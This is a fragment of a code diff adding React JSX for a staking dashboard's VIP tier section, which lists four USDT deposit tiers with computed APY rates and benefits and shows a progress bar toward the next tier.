+                <h2 className="section-title">All VIP Tiers</h2>
+                <div className="tiers-list">
+                  <div className={`tier-item ${userData.vipLevel === 0 ? 'active' : ''}`}>
+                    <div className="tier-badge-dash">Normal</div>
+                    <div className="tier-requirement">0 - 9,999 USDT</div>
+                    <div className="tier-apy-dash">{platformSettings.baseAPY}% APY</div>
+                    <div className="tier-benefits">
+                      <div>✓ Standard support</div>
+                      <div>✓ Daily compounding</div>
+                    </div>
+                  </div>
+
+                  <div className={`tier-item ${userData.vipLevel === 1 ? 'active' : ''}`}>
+                    <div className="tier-badge-dash">VIP 1</div>
+                    <div className="tier-requirement">10,000 - 49,999 USDT</div>
+                    <div className="tier-apy-dash">{(platformSettings.baseAPY + platformSettings.vip1Bonus).toFixed(2)}% APY</div>
+                    <div className="tier-benefits">
+                      <div>✓ Priority support</div>
+                      <div>✓ Bonus rewards</div>
+                      <div>✓ Advanced analytics</div>
+                    </div>
+                  </div>
+
+                  <div className={`tier-item ${userData.vipLevel === 2 ? 'active' : ''}`}>
+                    <div className="tier-badge-dash">VIP 2</div>
+                    <div className="tier-requirement">50,000 - 99,999 USDT</div>
+                    <div className="tier-apy-dash">{(platformSettings.baseAPY + platformSettings.vip2Bonus).toFixed(2)}% APY</div>
+                    <div className="tier-benefits">
+                      <div>✓ Dedicated manager</div>
+                      <div>✓ Higher rewards</div>
+                      <div>✓ Early access</div>
+                      <div>✓ Lower fees</div>
+                    </div>
+                  </div>
+
+                  <div className={`tier-item ${userData.vipLevel === 3 ? 'active' : ''}`}>
+                    <div className="tier-badge-dash premium">VIP 3</div>
+                    <div className="tier-requirement">100,000+ USDT</div>
+                    <div className="tier-apy-dash">{(platformSettings.baseAPY + platformSettings.vip3Bonus).toFixed(2)}% APY</div>
+                    <div className="tier-benefits">
+                      <div>✓ All benefits</div>
+                      <div>✓ Maximum rewards</div>
+                      <div>✓ 24/7 VIP support</div>
+                      <div>✓ No fees</div>
+                      <div>✓ Exclusive events</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              {userData.vipLevel < 3 && (
+                <div className="next-tier-progress">
+                  <h3>Progress to {getVipName(userData.vipLevel + 1)}</h3>
+                  <div className="progress-bar">
+                    <div className="progress-fill" style={{
+                      width: `${Math.min(100, (userData.stakedAmount / [10000, 50000, 100000][userData.vipLevel]) * 100)}%`
+                    }}></div>
+                  </div>
+                  <div className="progress-info">
+                    <span>Current: {formatNumber(userData.stakedAmount)} USDT</span>
+                    <span>Need: {formatNumber(Math.max(0, [10000, 50000, 100000][userData.vipLevel] - userData.stakedAmount))} more USDT</span>
+                  </div>
+                </div>
+              )}
+            </div>
+          )}
+        </div>
+      </main>
     </div>
   );
 }
